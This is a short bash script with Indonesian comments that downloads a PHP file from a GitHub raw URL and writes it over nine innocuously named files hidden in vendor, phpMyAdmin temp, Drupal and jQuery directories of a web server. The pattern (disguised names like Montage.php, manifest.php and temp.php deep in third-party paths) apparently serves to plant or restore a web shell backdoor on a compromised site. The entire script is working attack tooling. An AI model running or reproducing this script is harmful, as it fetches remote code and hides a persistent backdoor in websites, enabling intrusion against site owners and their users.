#!/bin/bash

# URL sumber
SOURCE_URL="https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/jalpinzp.php"

# Download isi baru
NEW_CONTENT=$(curl -fsSL "$SOURCE_URL")
if [ -z "$NEW_CONTENT" ]; then
    echo "Gagal mengambil content!"
    exit 1
fi

# Daftar file yang akan diganti
FILES=(
"/home/main-site/public_html/vendor/masterminds/html5/src/HTML5/Serializer/Default/Montage.php"
"/home/main-site/public_html/phpmyadmin/vendor/williamdes/mariadb-mysql-kbs/dist/manifest.php"
"/home/main-site/public_html/phpmyadmin/tmp/twig/ba/tools.php"
"/home/main-site/public_html/modules/admin_toolbar/admin_toolbar_links_access_filter/Modules/Template.php"
"/home/main-site/public_html/libraries/flexslider/bower_components/jquery/dist/templates/temp.php"
"/home/main-site/public_html/drupal/vendor/ralouphie/getallheaders/src/index.txt"
"/home/main-site/public_html/drupal/temp.php"
"/home/main-site/public_html/drupal/sites/manifest.php"
"/home/main-site/public_html/sites/default/temp.php"
)

# Loop replace
for FILE in "${FILES[@]}"; do
    if [ -f "$FILE" ]; then
        echo "Backup & replace: $FILE"
        cp "$FILE" "$FILE.bak"
        echo "$NEW_CONTENT" > "$FILE"
    else
        echo "File tidak ditemukan: $FILE"
    fi
done

echo "Selesai."
